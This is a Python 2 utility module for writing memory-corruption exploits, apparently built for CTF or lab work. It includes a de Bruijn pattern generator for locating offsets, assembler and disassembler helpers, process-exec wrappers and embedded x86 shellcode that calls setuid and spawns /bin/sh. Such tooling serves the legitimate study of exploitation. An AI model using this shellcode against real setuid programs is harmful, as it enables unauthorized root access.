import itertools
import re
import random
import string
import struct
import os
import sys
from sys import stdin, stdout, stderr, exit
import tempfile
import ctypes
import subprocess
import time
import functools
from time import sleep

LC = string.ascii_lowercase
UC = string.ascii_uppercase

def pack(x):
  if isinstance(x, int):
    return struct.pack("I", x)
  return x

class shellcode:
  # setuid(geteuid()); system("/bin/sh")
  class x86:
    shell_euid = (
      "\xeb\x2b\x5e\x31\xc0\xb0\x46\x31\xdb\x66\xbb\xfa\x01\x31\xc9\x66"
      "\xb9\xfa\x01\xcd\x80\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89"
      "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xd0\xff"
      "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\xff\xff\xff"
    )

def de_bruijn(k, n):
  a = [0] * k * n
  sequence = []
  def db(t, p):
    if t > n:
      if n % p == 0:
        for j in range(1, p + 1):
          sequence.append(a[j])
    else:
      a[t] = a[t - p]
      db(t + 1, p)
      for j in range(a[t - p] + 1, k):
        a[t] = j
        db(t + 1, t)
  db(1, 1)
  return sequence

class Pattern:
  def __init__(self, n):
    alph = string.ascii_uppercase + string.ascii_lowercase + string.digits
    if n <= len(alph):
      self.s = alph[:n]
      return
    if n <= len(alph)**2:
      self.s = "".join(alph[i] for i in de_bruijn(len(alph), 2))[:n]
      return
    s = ""
    for a,b,c in itertools.product(
                      string.ascii_uppercase,
                      string.ascii_lowercase,
                      string.digits):
      s += a + b + c
      if len(s) >= n:
        break
    assert len(s) >= n
    self.s = s[:n]
  def __str__(self):
    return self.s
  def offset(self, x):
    p = pack(x)
    i = self.s.index(p)
    try:
      self.s[i+len(p):].index(p)
    except ValueError:
      return i
    else:
      raise ValueError, "Not unique!"


def assemble(code, bits=32):
  if code[-1] != "\n":
    code += "\n"
  with tempfile.NamedTemporaryFile() as inp:
    with tempfile.NamedTemporaryFile() as outp:
      fnameIn = inp.name
      fnameOut = outp.name
      inp.write(code)
      inp.flush()
      os.system("as --%d %s -o %s" % (bits, fnameIn, fnameOut))
      sc = os.popen('objdump -d %s |grep "^ " |cut -f2' % fnameOut).read()
      return "".join(chr(int(x,16)) for x in sc.split())

def tohex(s):
  return " ".join("%02x" % ord(c) for c in s)

def fromhex(s):
  return "".join(s.split()).decode("hex")

def disas(code):
  import capstone
  def tohex(s):
    return " ".join("%02x" % c for c in s)

  md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)
  offset = 0x0
  for i in md.disasm(code, offset):
    print "0x%08x: %-20s %s %s" % (i.address,
                                  " ".join("%02x" % c for c in i.bytes),
                                  i.mnemonic,
                                  i.op_str)

def contains_not(x, bad):
  assert not any(c in bad for c in x)
def contains_only(x, good):
  assert all(c in good for c in x)

libc = ctypes.CDLL("libc.so.6")
def execvp(fname, args):
  for x in args: contains_not(x, "\0")
  Args = ctypes.c_char_p * (len(args)+1)
  libc.execvp(fname, Args(*(args + [0])))

def execvpe(fname, args, env):
  for x in args: contains_not(x, "\0")
  for x in env: contains_not(x, "\0")
  Args = ctypes.c_char_p * (len(args)+1)
  Env = ctypes.c_char_p * (len(env)+1)
  libc.execvpe(fname, Args(*(args + [0])), Env(*(env + [0])))

def readall(read_func):
  # Does not work if the amount of data actually available is a multiple of
  # the buffer size!
  res = []
  while True:
    part = read_func(4096)
    res.append(part)
    if len(part) < 4096:
      break
  return "".join(res)

def pipe(cmd, inp=""):
  return (subprocess.Popen(cmd,
                  stdin=subprocess.PIPE,
                  stdout=subprocess.PIPE,
                  stderr=subprocess.PIPE)
             .communicate(inp)[0])

def instrument(cmd, args, env):
  stdin_read, stdin_write = os.pipe()
  stdout_read, stdout_write = os.pipe()
  pid = os.fork()
  if pid == 0:
    # child
    os.dup2(stdin_read, 0)
    os.dup2(stdout_write, 1)
    execvpe(cmd, args, env)
  return (os.fdopen(stdin_write, "w"),
          os.fdopen(stdout_read, "r"),
          lambda: os.waitpid(pid, 0))

def xor_str(s, key):
  return "".join(chr(ord(c)^ord(k)) for c, k in zip(s, itertools.cycle(key)))
